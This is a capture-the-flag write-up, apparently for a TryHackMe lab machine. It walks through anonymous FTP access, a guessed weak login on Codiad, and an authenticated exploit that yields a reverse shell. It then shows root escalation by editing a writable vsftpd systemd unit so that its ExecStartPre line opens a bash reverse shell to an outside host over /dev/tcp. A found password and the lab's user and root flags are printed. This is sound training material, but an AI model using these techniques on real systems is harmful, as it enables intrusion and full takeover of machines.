
----

## Description

Gain a shell on the box and escalate your privileges!

---------

#### Given IP -> 10.82.143.28

The first thing I did was putting the **IP mapping of the IP to ide.thm** on **/etc/hosts**

Then I visited the website (if there was one).

This is what I saw.
![[Pasted image 20251126191233.png]]

Checking the source code, nothing special.
![[Pasted image 20251126191313.png]]

I decided run my normal nmap scan.

---

## Nmap

I knew the ports because I previous did another fast scan to all ports.
![[Pasted image 20251126191607.png]]

Nice, we have 3 open ports:

1. 21 (**ftp** with **anonymous login allowed**)
2. 22 (ssh)
3. 80 (our website)

I will still scan the website using gobuster, but first, lets check the ftp server.

---

## FTP

Connecting to the ftp server, we get a weird directory `...`, going inside that dir, we see a file named `-`.
![[Pasted image 20251126191814.png]]

We have **two usernames**:
> drac
> john

Also we know **drac resetted john's password** and its **now the default one**.

Lets use **gobuster** to find any **hidden directories** or app.

---

## Gobuster 

![[Pasted image 20251126192812.png]]

Not finding anything, which is weird, but then I remeber somehow I missed on port that I saw on my fast scan to all ports.

Doing the nmap scan again, I saw this.
![[Pasted image 20251126192857.png]]
We have one more hidden service -> Codiad.

---

## Codiad

Lets check it out.
![[Pasted image 20251126193004.png]]

We have a **login page**, we know **two users**, and we know **john's password was reset to the default value**. We also know from the nmap scan that the **service running is Codiad**.

Lets try to find **Codiad's default password**.

...

I didn't find any default password, but I tried some simples ones like:

1. admin
2. codiad
3. password

And for my surprise password worked.
![[Pasted image 20251126193524.png]]

I also saw, while looking for the default password, that there is a exploit for this service.
![[Pasted image 20251126193614.png]]

Since **we are authenticated**, it **works**.

Lets try it out.
![[Pasted image 20251126194625.png]]

Nice, we got a rev shell.

I then decided to download linpeas.sh into the machine to find anything useful.
![[Pasted image 20251126194924.png]]
![[Pasted image 20251126194929.png]]

On the scan I found this.
![[Pasted image 20251126195241.png]]

> drac:Th3dRaCULa1sR3aL

Lets switch to the user drac and get the user.txt flag.
![[Pasted image 20251126195735.png]]

==USER FLAG==
```user flag
02930d21a8eb009f6d26361b2d24a466
```

Running sudo -l -l, we see this.
![[Pasted image 20251126195815.png]]

We can run `/usr/sbin/service vsftpd restart` as sudo.

Running this command to find the vsftpd service file.
![[Pasted image 20251126200033.png]]

We see these two files, which we also have permission to write.
![[Pasted image 20251126200057.png]]![[Pasted image 20251126200108.png]]

Lets change the file to this.
```
[Unit]
Description=vsftpd FTP server
After=network.target

[Service]
Type=simple
ExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf
ExecReload=/bin/kill -HUP $MAINPID
ExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/192.168.133.89/2222 0>&1'

[Install]
WantedBy=multi-user.target

```

Then 
```sh
systemctl daemon-reload
```

To reload the file, and after that we just have to setup a nc listener and execute
`/usr/sbin/service vsftpd restart`
![[Pasted image 20251126201845.png]]

==ROOT FLAG==
```root flag
ce258cb16f47f1c66f0b0b77f4e0fb8d
```